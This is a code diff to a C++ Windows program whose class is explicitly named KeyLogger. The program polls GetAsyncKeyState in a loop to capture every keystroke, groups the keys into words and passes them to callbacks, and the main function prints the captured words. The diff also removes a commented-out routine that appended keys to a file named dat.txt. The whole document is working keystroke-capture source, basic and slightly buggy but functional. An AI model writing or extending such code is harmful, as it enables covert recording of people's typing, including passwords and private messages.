@@ -5,121 +5,113 @@
 #include <stdio.h>
 #include <iostream>
 #include <fstream>
+#include <vector>
+
+
+bool IsSpecialKey(int S_Key) {
+    switch (S_Key)
+    {
+        case '¾': 
+        case VK_SHIFT:
+        case VK_RBUTTON:
+        case VK_CAPITAL:
+        case VK_CONTROL:
+        case VK_MENU:
+            return true;
+        default:
+            return false;
+    }
+}
 
 /*
-void LOG(string input) {
-    fstream LogFile;
-    LogFile.open("dat.txt", fstream::app);
-    if (LogFile.is_open()) {
-        LogFile << input;
-        LogFile.close();
-    }
-}
+* Return the current pressed key or null
 */
-
-bool SpecialKeys(int S_Key) {
-    switch (S_Key) {
-    case VK_SPACE:
-        std::cout << " ";
-        return true;
-    case VK_RETURN:
-        std::cout << "\n";
-        return true;
-    case '¾':
-        std::cout << ".";
-        // LOG(".");
-        return true;
-    case VK_SHIFT:
-        std::cout << "#SHIFT#";
-        // LOG("#SHIFT#");
-        return true;
-    case VK_BACK:
-        std::cout << "\b";
-        // LOG("\b");
-        return true;
-    case VK_RBUTTON:
-        std::cout << "#R_CLICK#";
-        // LOG("#R_CLICK#");
-        return true;
-    case VK_CAPITAL:
-        std::cout << "#CAPS_LOCK#";
-        // LOG("#CAPS_LCOK");
-        return true;
-    case VK_TAB:
-        std::cout << "#TAB";
-        // LOG("#TAB");
-        return true;
-    case VK_UP:
-        std::cout << "#UP";
-        // LOG("#UP_ARROW_KEY");
-        return true;
-    case VK_DOWN:
-        std::cout << "#DOWN";
-        // LOG("#DOWN_ARROW_KEY");
-        return true;
-    case VK_LEFT:
-        std::cout << "#LEFT";
-        // LOG("#LEFT_ARROW_KEY");
-        return true;
-    case VK_RIGHT:
-        std::cout << "#RIGHT";
-        // LOG("#RIGHT_ARROW_KEY");
-        return true;
-    case VK_CONTROL:
-        std::cout << "#CONTROL";
-        // LOG("#CONTROL");
-        return true;
-    case VK_MENU:
-        std::cout << "#ALT";
-        // LOG("#ALT");
-        return true;
-    default:
-        return false;
-    }
-}
-
 class KeyLogger {
-    public: char** words;
-    public: static void start()
+    /*
+    * All the words written by the user.
+    */
+    // public: static std::vector<std::string> words;
+    /*
+    * Start the KeyLogger loop.
+    */
+public: static void start(void(*charCallback)(char), void(*wordCallback)(std::string))
     {
         std::string word;
         while (true) {
             Sleep(10);
             char character = KeyLogger::catchChar();
-            word = KeyLogger::buildWord(character, word);
-            /*char character = KeyLogger::catchChar();
-            if (character == ' ') {
-                std::cout << word;
+            if (isWordEnder((int) character)) {
+                wordCallback(word);
                 word = "";
                 continue;
             }
-            if (character != NULL) word = word + character;*/
+            if (character != NULL) {
+                if ((int)character == VK_BACK) word.pop_back();
+                else {
+                    word = word + character;
+                    charCallback(character);
+                }
+            }
         }
     }
-    public: static std::string buildWord(char character,  std::string word)
+    /*
+    * Return the current pressed key or null
+    */
+    public: static bool isWordEnder(int character)
     {
-        if (character == ' ') {
-            std::cout << word;
-            return word;
+        switch (character)
+        {
+            case VK_RETURN:
+            case VK_SPACE:
+            case VK_TAB:
+            case VK_UP:
+            case VK_DOWN:
+            case VK_LEFT:
+            case VK_RIGHT:
+                return true;
+            default:
+                return false;
         }
-        if (character != NULL) word = word + character;
-        return word;
     }
+    /*
+    * Return the current pressed key or null
+    */
     public: static char catchChar()
     {
         char KEY = 'x';
         for (int KEY = 8; KEY <= 190; KEY++)
         {
-            if (GetAsyncKeyState(KEY) == -32767) {
-                return char(KEY);
-            }
+            if (GetAsyncKeyState(KEY) == -32767 && !IsSpecialKey(KEY)) return char(KEY);
         }
         return NULL;
+    }
+    /*
+    * Return the current pressed key or null
+    */
+    public: static void forEachChar(void(*callback)(char))
+    {
+        KeyLogger::start(callback, [](std::string s) {});
+    }
+    /*
+    * Return the current pressed key or null
+    */
+    public: static void forEachWord(void(*callback)(std::string))
+    {
+        KeyLogger::start([](char c){}, callback);
     }
 };
 
 int main()
 {
-    KeyLogger::start();
+    // KeyLogger::forEachChar([](char character) {
+        // std::cout << character;
+    // });
+
+    std::vector<std::string> words;
+    // for (const auto& value: words) std::cout << value + char(VK_SPACE);
+    KeyLogger::forEachWord([](std::string word) {
+        // (words).push_back(word);
+        std::cout << word;
+    });
     return 0;
 }
